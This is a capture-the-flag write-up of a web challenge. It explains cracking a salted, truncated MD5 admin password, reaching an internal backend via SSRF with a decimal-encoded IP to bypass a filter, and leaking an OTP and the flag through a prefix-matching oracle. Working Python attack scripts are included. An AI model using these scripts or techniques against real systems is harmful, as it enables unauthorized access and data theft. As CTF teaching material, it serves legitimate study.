# Spiritual Science Research Foundation
Written: 2023-04-03

# Intro
We're given the backend code for a website, as well as access to the frondend website. There is also a postgres db but it doesn't seem vulnerable.

We can also notice there is a shared instance which means we will not get root shell or something like that which could destroy the experience for other users.

# Getting admin

The first step after playing around with the site is to dig into the code, and this jumps out:

```py
def validate_creds(username, password):
    if username and password:
        password = hash_password(username, password)
        if username == "admin":
            assert password == "8dbadad6b8558891ca60625fd547da21"
        if username in creds:
            return creds.get(username) == password 
    # -snip-

def hash_password(username, password):
    salt = hashlib.md5(username.encode('utf-8')).hexdigest()
    # long salt, unique per user
    hashed_password = hashlib.md5((f"{salt}_{password.lower()[:6]}").encode('utf-8')).hexdigest()
    return hashed_password
```

We get the md5 hash of the password. Dumping this into a rainbow table will result in nothing because of the salt, but we can see that the salt is the username (i.e. user controlled/fixed), and the password consists of non-uppercase letters of length up to 6. This means we can brute-force it with a script like:

```py
import hashlib, string

salt = hashlib.md5("admin".encode('utf-8')).hexdigest()
def hash_password(password):
    hashed_password = hashlib.md5((f"{salt}_{password.lower()[:6]}").encode('utf-8')).hexdigest()
    return hashed_password

alphabet = string.ascii_lowercase + string.digits + "_- "

fasit = "8dbadad6b8558891ca60625fd547da21"

# 6 digits
for a in alphabet:
    for b in alphabet:
        print("prefix", a + b) # progress bar
        for c in alphabet:
            for d in alphabet:
                for e in alphabet:
                    for f in alphabet:
                        password = a + b + c + d + e + f
                        hash = hash_password(password)
                        if hash == fasit:
                            print(password, hash)
                            exit()

# cyberz 8dbadad6b8558891ca60625fd547da21
```

And we send zledge our greatest gratitude for using a password starting with c.

# Finding the SSRF
Now we are admin but there isn't a lot to do. Eventually we find `/robots.txt` and see there exists a `/status`.

```
User-agent: *
Disallow: /status
```

Unfortunately `/status` doesn't contain any vulnerable code, but thankfully there is a link to the legacy `/status/old` which exposes two urls, one for the frontend, and one for the backend-auth.

```html
Check the status for the following applications here: 
<ul>
    <li><a href="/status/frontend">Frontend</a></li>
    <li><a href="/status/backend">Backend-auth</a></li>
</ul>
```

These actually redirect to
```
/status/10.100.136.198
/status/10.100.213.173
```

We cannot just change the IP to another one as it 404s (try `localhost` or `127.0.0.1`), but it reveals to us that the IP of the backend is `10.100.213.173`.

We can now abuse the new status page my noticing the request it makes to actually get the status.
```js
health_checker = function() { 
    $.post("/heartbeat?endpoint=localhost/ping&response=po", function(data) {
    // -snip-
```

Trying to set `endpoint=10.100.213.173` results in the following error:
```json
{
    "reason": "Only alphanumeric and /,: and @ is allowed in endpoint argument",
    "status": "error"
}
```

We can therefore encode the IPv4 address as a decimal instead of the standard octal representation, which does work.
```py
  10.100.213.173
= (10 << 24) + (100 << 16) + (213 << 8) + (173)
= 174380461
```
We have now achieved an SSRF, we can send arbitrary requests to the backend.

# Leaking data back
It's worth noting the `&response=po`, this tells the frontend what the returned status should be. Because the backend returns the plaintext `pong` we can see by experimenting that it does a prefix match. So if we send some request with `&response=abc` we know that if we get `{"status": true}` that `abc` is a prefix of the response.

I also verified this by pointing it to a webpage in the frontend and doing `&response=<!doctype html>` (but url encoded).

# Cracking the OTP
The interesting parts of the code is the following:

```py
def verify_otp(username, provided_otp):
    secret = get_secret(username)
    if secret:
        return provided_otp == TOTP(secret).now()[:4]
    return False

@app.route("/otp/<username>")
def otp(username):
    totp_secret = get_secret(username)
    if not totp_secret:
        return abort(400)
    return TOTP(totp_secret).now()[:4]

@app.route("/flag/<otp>")
@auth.login_required
def get_flag(otp):
    if not otp:
        return {"error": "OTP not provided"}
    if not verify_otp("admin", otp):
        return {"error": "OTP invalid"}
    sleep(0.5) # prevent brute force attacks
    return flag
```

Again we notice a slicing operation happening. OTP codes are `[0-9]` (think about using 2FA yourself) and since there are only 4 digits this means there are only `10^4 = 10000` possibillities. But because we check prefixes we can do each digit at a time, which means there are `40` combinations and we on average will use `20` tries.

We can also see that the brute force protection happens only in the branch where the flag *is* returned, so it's completely useless. Not to mention that the protection is for only one of the endpoints.

We end up with something like
```py
from requests import session
import string

BASE = "http://webapp.pwn.toys"
s = session()

def get_otp():
    def url(response):
        return f"{BASE}/heartbeat?endpoint=174380461/otp/admin&response={response}"
    
    answer = ""
    for _ in range(4):
        for v in range(10):
            u = url(answer + str(v))
            r = s.post(u).json()
            if r["status"]:
                answer += str(v)
                break
        else:
            print("No digit is correct, try again, might be bad timing")
            assert(False)
    return answer

def brute_flag():
    def url(otp, response):
        return f"{BASE}/heartbeat?endpoint=admin:cyberz@174380461/flag/{otp}&response={response}"

    # discovered that all the letters were hex
    alphabet = "0123456789abcdef" + "_-}"

    flag = "flag{"
    otp = get_otp()
    print("OTP:", otp)
    
    while "}" not in flag:
        # make sure last is correct
        u = url(otp, flag)
        r = s.post(u).json()
        print("Last is correct:", r["status"])

        for v in alphabet:
            nflag = flag + v

            r = s.post(url(otp, nflag)).json()["status"]
            # check that the OTP is still valid *after* we try a letter
            inv = s.post(url(otp, '{"error":"OTP invalid"}')).json()["status"]

            if inv:
                print("OPT stale...")
                otp = get_otp()
                print("OTP:", otp)
                
                r = s.post(url(otp, nflag)).json()["status"]
                inv = s.post(url(otp, '{"error":"OTP invalid"}')).json()["status"]
                assert(not inv)
                

            if r:
                flag = nflag
                print(flag)
                break
        else:
            print("No character is correct, make better alphabet!")
            exit(1)
    
    # flag{bl0663r5_b3_bl0661n6}
    print(flag)
    u = url(otp, flag)
    r = s.post(u).json()
    print("Correct: ", r["status"])
```

# Flag
`flag{bl0663r5_b3_bl0661n6}`

# Thoughts
I really liked this task although it took me a while to find out what to do. Spent a lot of time figuring out the IPv4 encoding, so it was pretty satisfying to solve this.